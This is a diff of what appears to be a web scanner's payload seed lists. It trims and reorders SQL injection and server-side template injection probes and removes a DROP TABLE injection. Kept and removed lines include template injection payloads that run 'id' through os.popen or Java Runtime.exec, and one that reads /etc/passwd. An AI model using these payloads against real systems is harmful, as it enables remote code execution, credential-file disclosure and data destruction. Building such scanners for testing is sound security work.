@@ -186,7 +186,6 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
     "stacked": [
         {"raw": "'; SELECT 1-- ", "ctx": ["string"]},
         {"raw": "'; SELECT 1;-- ", "ctx": ["string"]},
-        {"raw": "'; DROP TABLE IF EXISTS test_temp;-- ", "ctx": ["string"]},
         {"raw": '"; SELECT 1-- ', "ctx": ["string"]},
         {"raw": "1; SELECT 1-- ", "ctx": ["numeric"]},
     ],
@@ -336,31 +335,16 @@ LFI_SEEDS: Dict[str, List[dict]] = {
 
 SSTI_SEEDS: Dict[str, List[dict]] = {
     "detect": [
-        {"raw": "{{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
-        {"raw": "${999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
-        {"raw": "#{999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
-        {"raw": "*{999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
-        {"raw": "<%= 999999 * 999999 %>", "indicator": "999998000001", "ctx": ["all"]},
-        {"raw": "${{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
         {"raw": "{{7*'7'}}", "indicator": "7777777", "ctx": ["all"]},
         {"raw": "{{config}}", "indicator": "config", "ctx": ["all"]},
-        {"raw": "{{999999+999999}}", "indicator": "1999998", "ctx": ["all"]},
-        {"raw": "{{'a'.upper()}}", "indicator": "A", "ctx": ["all"]},
-        {"raw": "{{[].__class__}}", "indicator": "list", "ctx": ["all"]},
-        {"raw": "${7*7}", "indicator": "49", "ctx": ["all"]},
-        {"raw": "#{7*7}", "indicator": "49", "ctx": ["all"]},
         {"raw": "{{'aaaa'.indexOf('b')}}", "indicator": "-1", "ctx": ["all"]},
         {"raw": "{{'aaaa'.indexOf('a')}}", "indicator": "0", "ctx": ["all"]},
         {"raw": "{{[0,1,2].length}}", "indicator": "3", "ctx": ["all"]},
-        # Mako template
-        {"raw": "${self.module.cache.__dict__}", "indicator": "cache", "ctx": ["all"]},
-        # Tornado template
-        {"raw": "{% raw 7*7 %}", "indicator": "49", "ctx": ["all"]},
-        # Smarty template
-        {"raw": "{$smarty.version}", "indicator": ".", "ctx": ["all"]},
-        # Freemarker / Java
         {"raw": "${7*7}", "indicator": "49", "ctx": ["all"]},
-        {"raw": "${\"7\"*\"7\"}", "indicator": "7777777", "ctx": ["all"]},
+        {"raw": "#{7*7}", "indicator": "49", "ctx": ["all"]},
+        {"raw": "{{[].__class__}}", "indicator": "list", "ctx": ["all"]},
+        {"raw": "{{'a'.upper()}}", "indicator": "A", "ctx": ["all"]},
+        {"raw": "{{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
     ],
     "blind": [
         {"raw": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
@@ -372,12 +356,7 @@ SSTI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "${script['java'].newInstance('java.lang.Runtime').exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        # Java SSTI RCE
         {"raw": "${T(java.lang.Runtime).getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class.forName('java.lang.String')).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", "indicator": "uid=", "ctx": ["all"]},
-        # Velocity template
-        {"raw": "#set($x='') $x.class.forName('java.lang.Runtime').getRuntime().exec('id')", "indicator": "uid=", "ctx": ["all"]},
-        # Jinja2 file read
         {"raw": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}", "indicator": "root:", "ctx": ["all"]},
     ],
 }
